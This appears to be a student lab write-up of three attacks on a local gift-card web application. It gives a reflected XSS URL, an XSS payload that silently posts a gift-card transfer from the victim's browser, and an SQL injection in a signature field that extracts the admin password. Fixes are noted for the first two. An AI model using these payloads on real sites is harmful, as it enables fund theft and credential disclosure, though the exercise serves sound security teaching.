 

Attack 1

http://127.0.0.1:8000/gift.html?director=%3Cscript%3Ealert(%22intruder%22)%3C/script%3E=
that attack s scros site scripting if you modified the users URL to have director point to http://127.0.0.1:8000/gift.html?director=%3Cscript%3Ealert(%22intruder%22)%3C/script%3E=
the result is the image above.
solution is to remove the safe tag found Endorsed by {{director}}!</p> . the reasoning is that with the safe tag the attacker can turn off auto escape as an execution of payload is successful. 



Attack 2:
For this attack, we make a user send a POST request that gifts a card to our account without their knowledge by taking advantage
of XSS. We again inject a script into the HTML that has been marked as safe. The script that gets executed is the following:

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/gift/0", true);
    var formData = new FormData();
    formData.append("username", "bob");
    formData.append("amount", "2000");
    xhr.send(formData);

This creates a POST request from the victim user's browser, and gifts the attacker's account the amount indicated. This script is embedded
in a URL supplied to the victim, for example:

http://127.0.0.1:8000/gift.html?director=%3Cscript%20id=%22maliciousScript%22%3E%20let%20xhr%20=%20new%20XMLHttpRequest();%20xhr.open(%22POST%22,%20%27/gift/0%27,%20true);%20var%20formData%20=%20new%20FormData();%20formData.append(%22username%22,%20%22Chris%22);%20formData.append(%22amount%22,%20%221000%22);%20xhr.send(formData);%20%3C/script%3E

To solve this, we again need to remove the `safe` marking for the HTML, so that the supplied script is escaped and not executed by the victim's browser.
While we achieved this attack using XSS, similar attacks may be possible to accomplish by CSRF. In order to protect against this, we will want to include CSRF token
in our request.


Attack 3:
 

"merchant_id": "NYU Apparel Card", "customer_id": "takemymoney", "total_value": "80", "records": [{"record_type": "amount_change", "amount_added": 2000, "signature": "[ insert crypto signature here ]' UNION Select password from LegacySite_user where LegacySite_user.username='admin';--"}]}
